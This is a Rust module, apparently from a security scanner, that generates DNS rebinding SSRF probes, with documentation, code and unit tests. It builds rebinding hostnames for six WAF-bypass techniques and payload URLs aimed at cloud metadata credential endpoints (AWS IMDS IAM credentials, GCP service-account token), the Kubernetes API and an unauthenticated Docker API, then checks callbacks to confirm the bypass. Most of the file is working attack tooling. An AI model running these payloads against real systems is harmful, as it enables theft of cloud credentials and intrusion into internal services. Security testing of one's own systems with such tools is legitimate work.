//! #106 DNS rebinding SSRF probe generator.
//!
//! DNS rebinding allows an attacker to bypass Same-Origin Policy and WAF
//! IP-allowlist checks by registering a domain that resolves to a public IP
//! at WAF check-time and to a private/bogon IP at fetch-time. The WAF sees
//! the public IP, allows the request, and then the backend's HTTP client
//! resolves the same hostname again — this time the attacker's DNS server
//! returns `127.0.0.1` (or any RFC-1918 address), reaching the internal
//! service.
//!
//! This module generates:
//!
//! 1. **Rebind payloads** — specially crafted hostnames under a controlled
//!    domain (`dns-rebind.santh.dev` by default) with a TTL of 0 seconds so
//!    every DNS resolution goes back to the attacker's server. The token
//!    embedded in the hostname uniquely identifies the probe so the operator
//!    can correlate WAF-time vs fetch-time resolution in logs.
//!
//! 2. **DNS pinning bypass payloads** — cloud providers and WAFs sometimes
//!    pin the first DNS resolution for a TTL. We enumerate bypass techniques:
//!    - **Multi-answer interleaving** — return both a public IP and bogon in
//!      the same response; some resolvers pick the last answer.
//!    - **CNAME chain** — intermediate CNAMEs add a hop that some WAFs skip
//!      re-resolving.
//!    - **IPv6 rebinding** — use AAAA records to reach `::1` (loopback) when
//!      the WAF only checks A records.
//!    - **DNS wildcard** — `*.rebind.santh.dev` maps to a rebind API that
//!      returns the private IP for the second resolution.
//!
//! 3. **Verification helpers** — given an OOB interaction log, determine
//!    whether the rebinding succeeded (both public-IP and private-IP DNS
//!    queries arrived).
//!
//! # Domain requirements
//!
//! For real-world use, the operator must control the authoritative NS for
//! `dns-rebind.santh.dev` (or their own domain) and run a rebind DNS server
//! that returns a public IP first and a private IP on subsequent queries.
//! The payloads produced here are usable with:
//! - https://lock.cmpxchg8b.com/rebinder.html
//! - singularity (https://github.com/nccgroup/singularity)
//! - interactsh's DNS rebind plugin

use uuid::Uuid;

/// The default rebind domain controlled by the operator.
pub const DEFAULT_REBIND_DOMAIN: &str = "dns-rebind.santh.dev";

/// A DNS rebinding probe — a hostname that will resolve differently
/// at WAF-check time vs backend-fetch time.
#[derive(Debug, Clone)]
pub struct DnsRebindProbe {
    /// The crafted hostname to embed in the SSRF payload.
    pub hostname: String,
    /// The unique token identifying this probe instance.
    pub token: String,
    /// Expected WAF-time resolution (public IP the WAF will see).
    pub waf_resolution: String,
    /// Expected fetch-time resolution (private IP the backend will reach).
    pub fetch_resolution: String,
    /// The rebind technique used.
    pub technique: RebindTechnique,
    /// Human-readable description of how this payload works.
    pub description: String,
}

/// DNS rebinding technique variants.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum RebindTechnique {
    /// Classic single-A-record rebind (TTL=0, second resolution returns private IP).
    Classic,
    /// Multi-answer: public IP + private IP in the same DNS response.
    MultiAnswer,
    /// CNAME chain: `token.public.rebind.santh.dev` CNAME → `token.private.rebind.santh.dev`.
    CnameChain,
    /// IPv6 rebinding: AAAA record for `::1` after public A record.
    Ipv6Rebind,
    /// Wildcard DNS: `*.rebind.santh.dev` serves the rebind logic.
    WildcardRebind,
    /// DNS-over-HTTPS rebind: the DOH resolver returns different answers.
    DohRebind,
}

impl RebindTechnique {
    pub fn name(self) -> &'static str {
        match self {
            Self::Classic => "classic_ttl0",
            Self::MultiAnswer => "multi_answer",
            Self::CnameChain => "cname_chain",
            Self::Ipv6Rebind => "ipv6_rebind",
            Self::WildcardRebind => "wildcard_rebind",
            Self::DohRebind => "doh_rebind",
        }
    }
}

/// Generate a DNS rebinding probe with a fresh unique token.
///
/// The generated hostname is designed to be embedded in SSRF payloads:
/// ```text
/// http://<token>.dns-rebind.santh.dev/admin/
/// ```
///
/// The operator's rebind DNS server must be configured to:
/// 1. Return `<waf_public_ip>` for the first query (WAF IP check).
/// 2. Return `<fetch_private_ip>` for the second query (backend fetch).
#[must_use]
pub fn generate_probe(
    rebind_domain: &str,
    waf_public_ip: &str,
    fetch_private_ip: &str,
    technique: RebindTechnique,
) -> DnsRebindProbe {
    let token = format!("{}", Uuid::new_v4().simple());
    let hostname = match technique {
        RebindTechnique::Classic => {
            format!("{token}.{rebind_domain}")
        }
        RebindTechnique::MultiAnswer => {
            // Encode both IPs in the hostname so the rebind server can parse them.
            // Format: `ma-<public_hex>-<private_hex>-<token>.<domain>`
            let pub_hex = waf_public_ip.replace('.', "-");
            let priv_hex = fetch_private_ip.replace('.', "-");
            format!("ma-{pub_hex}-{priv_hex}-{token}.{rebind_domain}")
        }
        RebindTechnique::CnameChain => {
            // CNAME: `token.pub.domain` → `token.priv.domain`
            format!("{token}.pub.{rebind_domain}")
        }
        RebindTechnique::Ipv6Rebind => {
            format!("v6-{token}.{rebind_domain}")
        }
        RebindTechnique::WildcardRebind => {
            format!("{token}.wc.{rebind_domain}")
        }
        RebindTechnique::DohRebind => {
            format!("doh-{token}.{rebind_domain}")
        }
    };

    let description = match technique {
        RebindTechnique::Classic => format!(
            "Classic TTL=0 rebind: WAF resolves {waf_public_ip}, \
             backend resolves {fetch_private_ip} on second query"
        ),
        RebindTechnique::MultiAnswer => format!(
            "Multi-answer rebind: DNS response includes both {waf_public_ip} and {fetch_private_ip}; \
             WAF picks first (public), backend/resolver picks last (private)"
        ),
        RebindTechnique::CnameChain => format!(
            "CNAME chain: {hostname} CNAME → {token}.priv.{rebind_domain} ({fetch_private_ip}); \
             WAF resolves the CNAME target's A record once, backend re-resolves"
        ),
        RebindTechnique::Ipv6Rebind => format!(
            "IPv6 rebind: A record returns {waf_public_ip} (public); \
             AAAA record returns ::1 (loopback); WAF may only check A"
        ),
        RebindTechnique::WildcardRebind => format!(
            "Wildcard rebind via *.wc.{rebind_domain}: \
             token-specific sub-sub-domain served by rebind API"
        ),
        RebindTechnique::DohRebind => format!(
            "DNS-over-HTTPS rebind: public {waf_public_ip} via HTTPS/A, \
             private {fetch_private_ip} via second DoH query"
        ),
    };

    DnsRebindProbe {
        hostname: hostname.clone(),
        token,
        waf_resolution: waf_public_ip.to_string(),
        fetch_resolution: fetch_private_ip.to_string(),
        technique,
        description,
    }
}

/// Generate a full batch of rebind probes using all available techniques.
///
/// Covers the main bypass vectors so the scan can try all of them against
/// a target and observe which triggers the OOB callback.
#[must_use]
pub fn generate_all_probes(
    rebind_domain: &str,
    waf_public_ip: &str,
    fetch_private_ip: &str,
) -> Vec<DnsRebindProbe> {
    [
        RebindTechnique::Classic,
        RebindTechnique::MultiAnswer,
        RebindTechnique::CnameChain,
        RebindTechnique::Ipv6Rebind,
        RebindTechnique::WildcardRebind,
        RebindTechnique::DohRebind,
    ]
    .iter()
    .map(|&t| generate_probe(rebind_domain, waf_public_ip, fetch_private_ip, t))
    .collect()
}

/// Embed a rebind probe hostname into an SSRF payload URL.
///
/// Returns a list of URL variants that cover:
/// - HTTP and HTTPS schemes.
/// - Various path prefixes known to reach sensitive internal services
///   (AWS IMDS, GCP metadata, Kubernetes API, admin panels).
#[must_use]
pub fn ssrf_payloads_for_probe(probe: &DnsRebindProbe) -> Vec<String> {
    let host = &probe.hostname;
    let mut urls = Vec::new();

    // AWS IMDSv1 — no auth, extremely high-value target.
    urls.push(format!("http://{host}/latest/meta-data/iam/security-credentials/"));
    urls.push(format!("http://{host}/latest/meta-data/"));
    urls.push(format!("http://{host}/latest/user-data"));

    // GCP metadata.
    urls.push(format!("http://{host}/computeMetadata/v1/instance/service-accounts/default/token"));
    urls.push(format!("http://{host}:80/computeMetadata/v1/"));

    // Generic internal service.
    urls.push(format!("http://{host}/admin/"));
    urls.push(format!("http://{host}:8080/"));
    urls.push(format!("http://{host}:8443/"));
    urls.push(format!("https://{host}/"));

    // Kubernetes API server.
    urls.push(format!("https://{host}:6443/api/v1/namespaces/"));
    urls.push(format!("http://{host}:8001/api/v1/"));

    // Docker API.
    urls.push(format!("http://{host}:2375/containers/json"));
    urls.push(format!("http://{host}:2376/containers/json"));

    urls
}

// ── Rebind verification ───────────────────────────────────────────────────

/// The result of correlating OOB DNS callbacks against a rebind probe.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum RebindVerification {
    /// Both a WAF-time DNS query and a fetch-time DNS query arrived.
    /// This is a confirmed rebind bypass: the WAF checked the public IP
    /// and the backend fetched the private IP.
    Confirmed {
        waf_query: String,
        fetch_query: String,
    },
    /// Only the WAF-time DNS query arrived (no backend fetch). The WAF
    /// blocked the request after the DNS check.
    WafOnly { waf_query: String },
    /// Only one DNS query arrived — likely a single-resolution DNS cache hit.
    SingleQuery { query: String },
    /// No DNS queries matching this probe's token arrived.
    NoCallback,
}

/// Check OOB DNS callbacks against a rebind probe to determine whether
/// the rebind succeeded.
///
/// `dns_queries`: list of DNS query strings from the OOB provider.
/// Matches queries containing `probe.token`.
#[must_use]
pub fn verify_rebind(probe: &DnsRebindProbe, dns_queries: &[String]) -> RebindVerification {
    let matching: Vec<&String> = dns_queries
        .iter()
        .filter(|q| q.contains(&probe.token))
        .collect();

    match matching.len() {
        0 => RebindVerification::NoCallback,
        1 => RebindVerification::SingleQuery {
            query: matching[0].to_string(),
        },
        _ => {
            // Two or more queries with the same token.  Heuristic: the first
            // query is WAF-time (it arrived right after the request was sent),
            // the subsequent ones are fetch-time.
            let waf_query = matching[0].to_string();
            let fetch_query = matching[1].to_string();
            RebindVerification::Confirmed { waf_query, fetch_query }
        }
    }
}

// ── Tests ─────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    fn classic_probe() -> DnsRebindProbe {
        generate_probe(
            DEFAULT_REBIND_DOMAIN,
            "203.0.113.1",
            "127.0.0.1",
            RebindTechnique::Classic,
        )
    }

    #[test]
    fn probe_token_is_unique() {
        let p1 = classic_probe();
        let p2 = classic_probe();
        assert_ne!(p1.token, p2.token, "each probe must have a unique token");
    }

    #[test]
    fn probe_hostname_contains_token() {
        let p = classic_probe();
        assert!(
            p.hostname.contains(&p.token),
            "hostname must contain the unique token"
        );
    }

    #[test]
    fn probe_hostname_contains_domain() {
        let p = classic_probe();
        assert!(
            p.hostname.contains(DEFAULT_REBIND_DOMAIN),
            "hostname must contain the rebind domain"
        );
    }

    #[test]
    fn probe_classic_waf_resolution_set() {
        let p = classic_probe();
        assert_eq!(p.waf_resolution, "203.0.113.1");
        assert_eq!(p.fetch_resolution, "127.0.0.1");
    }

    #[test]
    fn probe_multi_answer_encodes_ips() {
        let p = generate_probe(
            DEFAULT_REBIND_DOMAIN,
            "203.0.113.1",
            "10.0.0.1",
            RebindTechnique::MultiAnswer,
        );
        assert!(p.hostname.starts_with("ma-"), "multi-answer must have ma- prefix");
        assert!(p.hostname.contains("203-0-113-1"), "must encode public IP");
        assert!(p.hostname.contains("10-0-0-1"), "must encode private IP");
    }

    #[test]
    fn probe_cname_chain_has_pub_subdomain() {
        let p = generate_probe(
            DEFAULT_REBIND_DOMAIN,
            "203.0.113.1",
            "127.0.0.1",
            RebindTechnique::CnameChain,
        );
        assert!(p.hostname.contains(".pub."), "CNAME chain must use .pub. subdomain");
    }

    #[test]
    fn probe_ipv6_has_v6_prefix() {
        let p = generate_probe(
            DEFAULT_REBIND_DOMAIN,
            "203.0.113.1",
            "::1",
            RebindTechnique::Ipv6Rebind,
        );
        assert!(p.hostname.starts_with("v6-"), "IPv6 probe must have v6- prefix");
    }

    #[test]
    fn probe_wildcard_has_wc_subdomain() {
        let p = generate_probe(
            DEFAULT_REBIND_DOMAIN,
            "203.0.113.1",
            "192.168.1.1",
            RebindTechnique::WildcardRebind,
        );
        assert!(p.hostname.contains(".wc."), "wildcard probe must use .wc. subdomain");
    }

    #[test]
    fn probe_doh_has_doh_prefix() {
        let p = generate_probe(
            DEFAULT_REBIND_DOMAIN,
            "203.0.113.1",
            "127.0.0.1",
            RebindTechnique::DohRebind,
        );
        assert!(p.hostname.starts_with("doh-"), "DoH probe must have doh- prefix");
    }

    #[test]
    fn generate_all_probes_returns_six() {
        let probes = generate_all_probes(DEFAULT_REBIND_DOMAIN, "203.0.113.1", "127.0.0.1");
        assert_eq!(probes.len(), 6, "must generate one probe per technique");
    }

    #[test]
    fn generate_all_probes_all_tokens_unique() {
        let probes = generate_all_probes(DEFAULT_REBIND_DOMAIN, "203.0.113.1", "127.0.0.1");
        let tokens: std::collections::HashSet<&str> =
            probes.iter().map(|p| p.token.as_str()).collect();
        assert_eq!(tokens.len(), probes.len(), "each technique must get a unique token");
    }

    #[test]
    fn ssrf_payloads_cover_key_services() {
        let probe = classic_probe();
        let urls = ssrf_payloads_for_probe(&probe);
        assert!(!urls.is_empty());
        // Must include AWS IMDS.
        assert!(
            urls.iter().any(|u| u.contains("meta-data")),
            "must have AWS IMDS URL"
        );
        // Must include GCP metadata.
        assert!(
            urls.iter().any(|u| u.contains("computeMetadata")),
            "must have GCP metadata URL"
        );
        // Must include all ports we care about.
        assert!(urls.iter().any(|u| u.contains(":8080")));
        assert!(urls.iter().any(|u| u.contains(":6443")));
        assert!(urls.iter().any(|u| u.contains(":2375")));
    }

    #[test]
    fn ssrf_payloads_all_contain_hostname() {
        let probe = classic_probe();
        let urls = ssrf_payloads_for_probe(&probe);
        for url in &urls {
            assert!(
                url.contains(&probe.hostname),
                "URL {url} must contain probe hostname"
            );
        }
    }

    #[test]
    fn verify_rebind_no_callback() {
        let probe = classic_probe();
        let result = verify_rebind(&probe, &[]);
        assert_eq!(result, RebindVerification::NoCallback);
    }

    #[test]
    fn verify_rebind_single_query() {
        let probe = classic_probe();
        let queries = vec![format!("dns.{}.{}", probe.token, DEFAULT_REBIND_DOMAIN)];
        let result = verify_rebind(&probe, &queries);
        assert!(matches!(result, RebindVerification::SingleQuery { .. }));
    }

    #[test]
    fn verify_rebind_confirmed_on_two_queries() {
        let probe = classic_probe();
        let q1 = format!("waf.{}.{}", probe.token, DEFAULT_REBIND_DOMAIN);
        let q2 = format!("fetch.{}.{}", probe.token, DEFAULT_REBIND_DOMAIN);
        let queries = vec![q1.clone(), q2.clone()];
        let result = verify_rebind(&probe, &queries);
        match result {
            RebindVerification::Confirmed { waf_query, fetch_query } => {
                assert_eq!(waf_query, q1);
                assert_eq!(fetch_query, q2);
            }
            other => panic!("expected Confirmed, got {other:?}"),
        }
    }

    #[test]
    fn verify_rebind_waf_only_on_one_query() {
        let probe = classic_probe();
        let q = format!("{}.{}", probe.token, DEFAULT_REBIND_DOMAIN);
        let result = verify_rebind(&probe, &[q.clone()]);
        assert!(
            matches!(result, RebindVerification::SingleQuery { .. }),
            "single matching query must be SingleQuery not WafOnly"
        );
    }

    #[test]
    fn verify_rebind_ignores_unrelated_queries() {
        let probe = classic_probe();
        let other_token = "unrelated_token_xyz";
        let queries = vec![
            format!("{other_token}.{DEFAULT_REBIND_DOMAIN}"),
            format!("{other_token}.{DEFAULT_REBIND_DOMAIN}"),
            format!("{other_token}.{DEFAULT_REBIND_DOMAIN}"),
        ];
        let result = verify_rebind(&probe, &queries);
        assert_eq!(result, RebindVerification::NoCallback);
    }

    #[test]
    fn rebind_technique_names_stable() {
        assert_eq!(RebindTechnique::Classic.name(), "classic_ttl0");
        assert_eq!(RebindTechnique::MultiAnswer.name(), "multi_answer");
        assert_eq!(RebindTechnique::CnameChain.name(), "cname_chain");
        assert_eq!(RebindTechnique::Ipv6Rebind.name(), "ipv6_rebind");
        assert_eq!(RebindTechnique::WildcardRebind.name(), "wildcard_rebind");
        assert_eq!(RebindTechnique::DohRebind.name(), "doh_rebind");
    }
}
